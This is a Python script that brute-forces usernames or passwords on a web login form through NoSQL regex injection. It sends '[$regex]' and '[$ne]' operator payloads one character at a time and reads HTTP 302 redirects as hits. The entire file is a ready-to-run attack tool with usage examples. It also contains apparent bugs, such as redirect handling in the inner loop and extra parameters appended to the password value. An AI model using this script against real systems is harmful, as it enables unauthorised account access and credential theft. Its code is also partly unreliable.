#!/usr/bin/python
import string
import requests
import argparse
import sys
from colorama import Fore

def get_arguments():
    parser = argparse.ArgumentParser(description="Script to enumerate a parameter using regex injection.")
    parser.add_argument("-u", "--url", metavar="URL", required=True, help="Form submission URL. Eg: http://example.com/index.php")
    parser.add_argument("-up", "--username-parameter", metavar="parameter", required=True, help="Parameter name of the username. Eg: username, user")
    parser.add_argument("-pp", "--password-parameter", metavar="parameter", required=True, help="Parameter name of the password. Eg: password, pass")
    parser.add_argument("-ep", "--enum-parameter", metavar="parameter", required=True, help="Parameter that needs to be enumerated. Eg: username, password")
    parser.add_argument("-op", "--other-parameters", metavar="parameters", help="Other parameters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
    parser.add_argument("-m", "--method", metavar="Method", choices=["GET", "POST"], default="POST", help="Method of the form. Eg: GET/POST")
    return parser.parse_args()

def print_help_and_exit(parser):
    print(parser.print_help(sys.stderr))
    print(Fore.YELLOW + f"\nExample: python {sys.argv[0]} -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
    exit(0)

def get_method(args):
    return requests.get if args.method.upper() == "GET" else requests.post

def build_payloads(characters):
    return [firstChar + char for firstChar in characters for char in characters]

def main():
    args = get_arguments()
    if len(sys.argv) == 1:
        print_help_and_exit(args)

    url = args.url
    username_parameter = args.username_parameter
    password_parameter = args.password_parameter
    enum_parameter = args.enum_parameter
    method = get_method(args)
    other_parameters = "," + args.other_parameters if args.other_parameters else ""

    # Remove special characters from the list of printable characters
    characters = ''.join(c for c in string.printable if c not in "$^&*|.+\?")

    loop = True
    final_output = []
    count = 0

    payloads = build_payloads(characters)

    for payload in payloads:
        para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}

        try:
            r = method(url, data=para, allow_redirects=False, timeout=5)  # Set a timeout in seconds
            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)

            if r.status_code == 302:
                loop = True
                print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
                userpass = payload
                while loop:
                    loop = False
                    for char in characters:
                        new_payload = userpass + char
                        para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}

                        try:
                            r = method(url, data=para, timeout=5)  # Set a timeout in seconds
                            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)

                            if r.status_code == 302:
                                print(Fore.YELLOW + f"Pattern found: {new_payload}")
                                userpass = new_payload
                                loop = True

                        except requests.exceptions.RequestException as e:
                            print(Fore.RED + "Error occurred during request:", e)
                            break

                print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
                final_output.append(userpass)
                count += 1

        except requests.exceptions.RequestException as e:
            print(Fore.RED + "Error occurred during request:", e)

    if count == 0:
        print(Fore.RED + f"No {enum_parameter} found")
    else:
        print(f"\n{count} {enum_parameter}(s) found:")
        print(Fore.RED + "\n".join(final_output))

if __name__ == "__main__":
    main()
